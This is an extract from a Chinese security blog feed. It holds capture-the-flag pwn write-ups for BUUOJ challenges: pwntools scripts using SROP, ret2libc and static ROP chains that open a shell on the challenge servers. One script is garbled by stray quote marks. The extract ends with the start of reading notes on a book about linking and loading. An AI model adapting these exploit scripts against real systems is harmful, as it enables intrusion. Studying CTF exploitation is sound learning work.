class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># local</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">c = process(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/smallest&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">syscall_ret = <span class="number">0x4000BE</span> <span class="comment">#源代码syscall处地址</span></span><br><span class="line">start_addr = <span class="number">0x4000B0</span>  <span class="comment">#源代码xor rax,rax处地址</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = p64(start_addr) * <span class="number">3</span>  <span class="comment">#部署三个start_addr，完成三次read函数的调用</span></span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#覆盖第二个start_addr的最后一个字节变成0x4000B3，越过对rax寄存器的清零，使得rax寄存器值变为1</span></span><br><span class="line">c.send(<span class="string">b&#x27;\xb3&#x27;</span>)  </span><br><span class="line"><span class="comment"># stack_addr = u64(c.recv()[8:16]) #接收接下要要部署的栈顶地址</span></span><br><span class="line">stack_addr = u64(c.recv()[<span class="number">0x188</span>:<span class="number">0x190</span>])</span><br><span class="line">log.success(<span class="string">&#x27;leak stack addr :&#x27;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">read = SigreturnFrame()</span><br><span class="line">read.rax = <span class="number">0</span> <span class="comment">#read函数系统调用号</span></span><br><span class="line">read.rdi = <span class="number">0</span>  <span class="comment">#read函数一参</span></span><br><span class="line">read.rsi = stack_addr  <span class="comment">#read函数二参</span></span><br><span class="line">read.rdx = <span class="number">0x400</span>  <span class="comment">#read函数三参</span></span><br><span class="line">read.rsp = stack_addr  <span class="comment">#和rsi寄存器中的值保持一致，确保read函数写的时候rsp指向stack_addr</span></span><br><span class="line">read.rip = syscall_ret <span class="comment">#使得rip指向syscall的位置，在部署好read函数之后能直接调用</span></span><br><span class="line">payload = p64(start_addr) + p64(syscall_ret) + <span class="built_in">bytes</span>(read)</span><br><span class="line">c.send(payload)</span><br><span class="line">c.send(payload[<span class="number">8</span>:<span class="number">8</span>+<span class="number">15</span>])  <span class="comment">#输入15个字节使得rax寄存器的值为15，进行sigreturn调用</span></span><br><span class="line"></span><br><span class="line">execve = SigreturnFrame()</span><br><span class="line">execve.rax = <span class="number">59</span></span><br><span class="line">execve.rdi = stack_addr + <span class="number">0x200</span>  </span><br><span class="line">execve.rsi = <span class="number">0x0</span> <span class="comment">#execve函数二参</span></span><br><span class="line">execve.rdx = <span class="number">0x0</span> <span class="comment">#execve函数二参</span></span><br><span class="line">execve.rsp = stack_addr </span><br><span class="line">execve.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">frame_payload = p64(start_addr) + p64(syscall_ret) + <span class="built_in">bytes</span>(execve)</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">len</span>(frame_payload))</span><br><span class="line"><span class="comment"># 将execve函数调用和/bin/sh字符串一起部署到栈中</span></span><br><span class="line">payload = frame_payload + (<span class="number">0x200</span> - <span class="built_in">len</span>(frame_payload)) * <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">c.send(payload)</span><br><span class="line">c.send(payload[<span class="number">8</span>:<span class="number">8</span>+<span class="number">15</span>])</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># remote</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">c = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26828</span>)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x4000B0</span></span><br><span class="line"></span><br><span class="line">payload1 = p64(main_addr) * <span class="number">3</span></span><br><span class="line">c.send(payload1)</span><br><span class="line">c.send(<span class="string">b&#x27;\xb3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = u64(c.recv()[<span class="number">0x188</span>:<span class="number">0x190</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] stack_addr = &#x27;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># sys_read</span></span><br><span class="line">syscall = <span class="number">0x4000BE</span> </span><br><span class="line">read = SigreturnFrame()</span><br><span class="line">read.rax = <span class="number">0</span></span><br><span class="line">read.rsi = stack_addr</span><br><span class="line">read.rdi = <span class="number">0</span></span><br><span class="line">read.rdx = <span class="number">0x400</span></span><br><span class="line">read.rsp = stack_addr</span><br><span class="line">read.rip = syscall</span><br><span class="line"></span><br><span class="line">payload2 = p64(main_addr) + p64(<span class="number">0</span>) + <span class="built_in">bytes</span>(read)</span><br><span class="line">c.send(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read 15 bytes --&gt; rax = 15</span></span><br><span class="line">payload3 = p64(syscall) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span></span><br><span class="line">c.send(payload3)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sys_execve</span></span><br><span class="line"><span class="built_in">exec</span> = SigreturnFrame()                                                        </span><br><span class="line"><span class="built_in">exec</span>.rax = <span class="number">59</span></span><br><span class="line"><span class="built_in">exec</span>.rdi = stack_addr + <span class="number">0x200</span>  </span><br><span class="line"><span class="built_in">exec</span>.rsi = <span class="number">0</span>   </span><br><span class="line"><span class="built_in">exec</span>.rdx = <span class="number">0</span>                                                                   </span><br><span class="line"><span class="built_in">exec</span>.rsp = stack_addr                                  </span><br><span class="line"><span class="built_in">exec</span>.rip = syscall                                                         </span><br><span class="line">payload4 = (p64(main_addr) + p64(<span class="number">0</span>) + <span class="built_in">bytes</span>(<span class="built_in">exec</span>)).ljust(<span class="number">0x200</span>, <span class="string">b&#x27;a&#x27;</span>) + <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">c.send(payload4)                                                                                                                               </span><br><span class="line">sleep(<span class="number">1</span>)   </span><br><span class="line"><span class="comment"># read 15 bytes --&gt; rax = 15</span></span><br><span class="line">c.send(payload3)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x40-cmcc-pwnme1"><a href="#0x40-cmcc-pwnme1" class="headerlink" title="0x40.cmcc_pwnme1"></a>0x40.cmcc_pwnme1</h2><p><code>ret2libc3 &amp; recv() </code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/67&quot;)</span></span><br><span class="line">c = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29880</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/67&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/libc/16libc32.so&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]  <span class="comment"># 0804a028</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]  <span class="comment"># 08048548</span></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>] <span class="comment"># 080486F4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xa4</span>+<span class="number">0x4</span>) +p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;&gt;&gt; 6. Exit    \n&#x27;</span>)</span><br><span class="line">c.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Please input the name of fruit:&#x27;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c.recvline())</span><br><span class="line">puts_addr = u32(c.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libcbase = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xa4</span>+<span class="number">0x4</span>) +p32(system_addr) + p32(main_addr) + p32(bin_sh)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;&gt;&gt; 6. Exit    \n&#x27;</span>)</span><br><span class="line">c.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Please input the name of fruit:&#x27;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230313/%E5%9B%BE%E7%89%87.1tkvyskgoha8.webp"></p><h2 id="0x41-cmcc-pwnme2-why-libc3-can-not"><a href="#0x41-cmcc-pwnme2-why-libc3-can-not" class="headerlink" title="0x41.cmcc_pwnme2(why libc3 can not?)"></a>0x41.cmcc_pwnme2(why libc3 can not?)</h2><p><code>ROP &amp; little trick </code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28161</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/68&quot;</span>)c<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">context.arch = &#x27;</span>i386<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">exec_string_addr =0x080485cb</span></span><br><span class="line"><span class="string">string_addr = 0x0804a060</span></span><br><span class="line"><span class="string">gets_addr = elf.sym[&#x27;</span>gets<span class="string">&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">c.recvuntil(&#x27;</span>Please <span class="built_in">input</span>:\n<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload= b&#x27;</span>a<span class="string">&#x27;*(0x6c+4)+ p32(gets_addr) + p32(exec_string_addr) + p32(string_addr)</span></span><br><span class="line"><span class="string">c.sendline(payload)</span></span><br><span class="line"><span class="string">c.sendline(b&#x27;</span>./flag<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">c.interactive()</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230313/%E5%9B%BE%E7%89%87.2c52bu77hegw.webp"></p><p>​    没太搞懂为什么不能用<code>ret2libc3</code></p><h2 id="0x42-picoctf-2018-got-shell"><a href="#0x42-picoctf-2018-got-shell" class="headerlink" title="0x42.picoctf_2018_got_shell"></a>0x42.picoctf_2018_got_shell</h2><p><code>trick &amp; replace</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230313/%E5%9B%BE%E7%89%87.35r8dvhlv79c.webp"></p><p>​    感觉<code>picoctf</code>出的题都很有脑洞的感觉。</p><p>​    <mark>got</mark>_shell !!!  第一反应应该是打got表而不是get_shell !</p><h2 id="0x43-picoctf-2018-can-you-gets-me"><a href="#0x43-picoctf-2018-can-you-gets-me" class="headerlink" title="0x43.picoctf_2018_can_you_gets_me"></a>0x43.picoctf_2018_can_you_gets_me</h2><p><code>静态链接 &amp; ret2libc3</code></p><blockquote><p>ROPgadget –binary 70 –ropchain</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/0_虚拟机共享文件夹/BUU/70&quot;)</span></span><br><span class="line">c = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25056</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x1c</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de955</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806cc25</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;GIVE ME YOUR NAME!\n&#x27;</span>)</span><br><span class="line">c.sendline(p)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 假期学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《程序员的自我修养:链接装载与库》笔记</title>
      <link href="/2023/01/11/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/01/11/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>The more u learn, the less u know.</p></blockquote><span id="more"></span><h1 id="一、本书总概"><a href="#一、本书总概" class="headerlink" title="一、本书总概"></a>一、本书总概</h1><h2 id="1-大致内容"><a href="#1-大致内容" class="headerlink" title="1.大致内容"></a>1.大致内容</h2><blockquote><ol><li>本书将详细描述现在流行的Windows和Linux操作系统下各自的可执行文件、目标文件格式；</li><li>普通C/C++程序代码如何被编译成目标文件及程序在目标文件中如何存储；</li><li>目标文件如何被链接器链接到一起，并且形成可执行文件；</li><li>目标文件在链接时符号处理、重定位和地址分配如何进行；</li><li>可执行文件如何被装载并且执行；</li><li>可执行文件与进程的虚拟空间之间如何映射；</li><li>什么是动态链接，为什么要进行动态链接；</li><li>Windows和Linux如何进行动态链接及动态链接时的相关问题；</li><li>什么是堆，什么是栈；</li><li>函数调用惯例；</li><li>运行库，Glibc和MSVC CRT的实现分析；</li><li>系统调用与API；</li><li>最后我们自己还实现了一个Mini CRT。</li></ol></blockquote><h2 id="2-文章目录"><a href="#2-文章目录" class="headerlink" title="2.文章目录"></a>2.文章目录</h2><h3 id="第1章-温故而知新"><a href="#第1章-温故而知新" class="headerlink" title="第1章 温故而知新"></a>第1章 温故而知新</h3><p>​        介绍基本的背景知识，包括硬件、操作系统、线程等。</p><h3 id="第2章-编译和链接"><a href="#第2章-编译和链接" class="headerlink" title="第2章 编译和链接"></a>第2章 编译和链接</h3><p>​        介绍编译和链接的基本概念和步骤。</p><h3 id="第3章-目标文件里有什么"><a href="#第3章-目标文件里有什么" class="headerlink" title="第3章 目标文件里有什么"></a>第3章 目标文件里有什么</h3><p>​        介绍COFF目标文件格式和源代码编译后如何在目标文件中存储。</p><h3 id="第4章-静态链接"><a href="#第4章-静态链接" class="headerlink" title="第4章 静态链接"></a>第4章 静态链接</h3><p>​        介绍静态链接与静态库链接的过程和步骤。</p><h3 id="第5章-Windows-PE-COFF"><a href="#第5章-Windows-PE-COFF" class="headerlink" title="第5章 Windows PE/COFF"></a>第5章 Windows PE/COFF</h3><p>​        介绍Windows平台的目标文件和可执行文件格式。</p><h3 id="第6章-可执行文件的装载与进程"><a href="#第6章-可执行文件的装载与进程" class="headerlink" title="第6章 可执行文件的装载与进程"></a>第6章 可执行文件的装载与进程</h3><p>​        介绍进程的概念、进程地址空间的分布和可执行文件映射装载过程。</p><h3 id="第7章-动态链接"><a href="#第7章-动态链接" class="headerlink" title="第7章 动态链接"></a>第7章 动态链接</h3><p>​        以Linux下的.so共享库为基础详细分析了动态链接的过程。</p><h3 id="第8章-Linux共享库的组织"><a href="#第8章-Linux共享库的组织" class="headerlink" title="第8章 Linux共享库的组织"></a>第8章 Linux共享库的组织</h3><p>​        介绍Linux下共享库文件的分布和组织。</p><h3 id="第9章-Windows下的动态链接"><a href="#第9章-Windows下的动态链接" class="headerlink" title="第9章 Windows下的动态链接"></a>第9章 Windows下的动态链接</h3><p>​        介绍Windows系统下DLL动态链接机制。</p><h3 id="第10章-内存"><a href="#第10章-内存" class="headerlink" title="第10章 内存"></a>第10章 内存</h3><p>​        主要介绍堆与栈，堆的分配算法，函数调用栈分布。</p><h3 id="第11章-运行库"><a href="#第11章-运行库" class="headerlink" title="第11章 运行库"></a>第11章 运行库</h3><p>​        主要介绍运行库的概念、C/C++运行库、Glibc和MSVC CRT、运行库如何实现C++全局构造和析构及以fread()库函数为例对运行库进行剖析。</p><h3 id="第12章-系统调用与API"><a href="#第12章-系统调用与API" class="headerlink" title="第12章 系统调用与API"></a>第12章 系统调用与API</h3><p>​        主要介绍Linux和Windows的系统调用及Windows 的API。</p><h3 id="第13章-运行库实现"><a href="#第13章-运行库实现" class="headerlink" title="第13章 运行库实现"></a>第13章 运行库实现</h3><p>​        本章主要实现了一个支持堆、基本文件操作、格式化字符串、基本输入输出、C++ new/delete、C++ string、C++全局构造和析构的Mini CRT。</p><h1 id="二、第一章"><a href="#二、第一章" class="headerlink" title="二、第一章"></a>二、第一章</h1><h2 id="1-由Hello-World程序引出的问题"><a href="#1-由Hello-World程序引出的问题" class="headerlink" title="1.由Hello World程序引出的问题"></a>1.由Hello World程序引出的问题</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello World\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ol><li>程序为什么要被编译器编译了之后才可以运行？</li><li>编译器在把C语言程序转换成可以执行的机器码的过程中做了什么，怎么做的？</li><li>最后编译出来的可执行文件里面是什么？除了机器码还有什么？它们怎么存放的，怎么组织的？</li><li>#include &lt;stdio.h&gt;是什么意思？把stdio.h包含进来意味着什么？C语言库又是什么？它怎么实现的？</li><li>不同的编译器（Microsoft VC、GCC）和不同的硬件平台（x86、SPARC、MIPS、ARM），以及不同的操作系统（Windows、Linux、UNIX、Solaris），最终编译出来的结果一样吗？为什么？</li><li>Hello World程序是怎么运行起来的？操作系统是怎么装载它的？它从哪儿开始执行，到哪儿结束？main函数之前发生了什么？main函数结束以后又发生了什么？</li><li>如果没有操作系统，Hello World可以运行吗？如果要在一台没有操作系统的机器上运行Hello World需要什么？应该怎么实现？</li><li>printf是怎么实现的？它为什么可以有不定数量的参数？为什么它能够在终端上输出字符串？</li><li>Hello World程序在运行时，它在内存中是什么样子的？</li></ol></blockquote><p>​    对于我在一年半前就很熟悉的简单的C程序，上面的9个问题我只能很浅地回答几个，大部分都非常模棱两可，希望能够在阅读本书的同时能够提升我对Hello World程序的理解并能够开始回答上面九个问题吧。(如果还能够提出自己发现的问题那就更好了。)</p><h2 id="2-再回首：计算机相关基础知识"><a href="#2-再回首：计算机相关基础知识" class="headerlink" title="2.再回首：计算机相关基础知识"></a>2.再回首：计算机相关基础知识</h2><p><strong>1.</strong> 